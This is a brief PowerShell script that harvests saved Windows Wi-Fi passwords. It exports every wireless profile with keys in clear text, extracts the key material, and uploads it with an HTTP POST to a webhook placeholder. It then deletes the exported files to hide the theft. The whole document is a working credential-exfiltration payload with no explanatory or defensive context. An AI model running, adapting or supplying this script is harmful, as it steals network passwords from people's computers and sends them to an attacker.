$tmpath = $env:TEMP;
$allpwds = "Wi-all";
$hook = "WEBHOOK_URL_HERE";
nEtSH.exe wlan export profile key=clear folder=$tmpath;
Select-String -Path $tmpath\\Wi*.xml -Pattern 'KeyMaterial' > $tmpath\$allpwds;
iwr -Uri $hook -Method POST -InFile $tmpath\$allpwds;
rm -Force -Path $tmpath\Wi-*;exit